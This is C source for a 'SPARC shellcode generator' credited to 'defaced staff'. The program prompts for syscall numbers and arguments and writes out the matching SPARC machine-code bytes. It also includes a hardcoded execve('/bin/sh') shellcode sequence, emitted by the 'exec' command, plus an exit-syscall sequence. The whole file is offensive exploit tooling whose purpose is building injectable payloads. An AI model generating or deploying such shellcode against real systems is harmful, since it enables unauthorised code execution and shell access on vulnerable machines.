/* Lame SPARC shellcode generator by defaced staff */

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>

int main(int argc, char *argv[])
{
  int x,y,a, argz, i,val, call1, call2, f, cnt = 0;
  char cmd[12];
  FILE *loga;

  printf("  \033[1;33mSPARC shellcode generator (MULTI-OS)\033[1;00m\n");

  if (argc < 2)
  {
    printf("usage: %s  <output_file>  [<calls_number>]\n", argv[0]);
    return 0;
  }

  loga = fopen(argv[1], "w+");

  if (argc == 3)
  {
    cnt = atoi(argv[2]);
    if (cnt <= 0) return 0;
  }

  printf(" Enter syscall number or mnemonic:\n \"exec\" - "
       "to insert execve() /bin/sh code\n \"exit\" - to insert exit()"
       " syscall and quit\n \"quit\" - to leave without saving\n");

  a = call1 = call2 = 0;

  while(1)
  {
    f = 0;

    if (cnt && a >= cnt)
    {
      fclose(loga);
      printf("[+] done\n");
      return 0;
    }

    write(1, "syscall>> ", 10);
    memset(&cmd, 0, 12);

    i = read(0, &cmd, 12);

    if (i < 1) continue;

    if (i > 3 && strncmp(cmd, "quit", 4) == 0)
    {
      fpurge(loga);
      exit(1);
    }

    if (i > 3 && strncmp(cmd, "exit", 4) == 0)
    {
      fprintf(loga, " \"\\x82\\x10\\x20\\x01\" \n");
      fprintf(loga," \"\\x91\\xd0\\x20\\x08\" // ta 8\n");
      fclose(loga);
      return 0;
    }

    if (i > 3 && strncmp(cmd, "exec", 4) == 0)
    {
      fprintf(loga," \"\\x21\\x0b\\xcb\\xd8\" \n");
      fprintf(loga," \"\\xa0\\x14\\x22\\x69\" \n");
      fprintf(loga," \"\\x23\\x1b\\x8b\\xdc\" \n");
      fprintf(loga," \"\\xa2\\x14\\x63\\x68\" \n");
      fprintf(loga," \"\\xe0\\x3b\\xbf\\xe8\" \n");
      fprintf(loga," \"\\xc0\\x23\\xbf\\xf0\" \n");
      fprintf(loga," \"\\x90\\x23\\xa0\\x18\" \n");
      fprintf(loga," \"\\xd0\\x23\\xbf\\xf4\" \n");
      fprintf(loga," \"\\xc0\\x23\\xbf\\xf8\" \n");
      fprintf(loga," \"\\x92\\x23\\xa0\\x0c\" \n");
      fprintf(loga," \"\\x94\\x1a\\x40\\x09\" \n");
      fprintf(loga," \"\\x82\\x10\\x20\\x3b\" \n");
      fprintf(loga," \"\\x91\\xd0\\x20\\x08\" \n");
      continue;
    }

    sscanf(cmd, "%i", &call2);

    if (call2 < 0 || call2 > 255)
    {
      printf("[!] bad syscall number\n");
      a--;
      continue;
    }

    if (cnt) a++; // okay, do syscalls count
    if (call1 == call2) f++;

    write(1, "args count>> ", 13);
    memset(&cmd, 0, 12);
    read(0, &cmd, 12);
    sscanf(cmd, "%i", &argz);

    if (argz < 0 || argz > 6)
    {
      printf("[!] bad args count\n");
      call1 = call2 = 0;
      a--; // counter back!
      continue;
    }

    if (!f)
    {
      x = call2;

      if (x < 16)
        fprintf(loga, " \"\\x82\\x10\\x20\\x0%x\" // syscall %i\n", x, call2);
      else
        fprintf(loga, " \"\\x82\\x10\\x20\\x%x\" // syscall %i\n", x, call2);
    }

    for (i=0; i < argz; i++)
    {
      val = 0;
      memset(&cmd, 0, 12);
      snprintf(cmd, 7, "arg_%i: \n", i);
      write(1, cmd, 7);
      scanf("%i", &val);

      if (val < 0 || val > 255)
      {
        printf("[!] too big value!\n");
        fclose(loga);
        return 0;
      }

      x = y = 0;
      x = 0x90+2*i;

      if (val == 0)
        fprintf(loga, " \"\\x%x\\x18\\x40\\x01\" \n", x);
      else
      {
        y = val;
         
        if (y < 16)
          fprintf(loga, " \"\\x%x\\x10\\x20\\x0%x\" \n", x, y);
        else
          fprintf(loga, " \"\\x%x\\x10\\x20\\x%x\" \n", x, y);
      }

    } // da end ;)

    fprintf(loga, " \"\\x91\\xd0\\x20\\x08\" // ta 8\n");

    call1 = call2;
    // repeat
  }

}
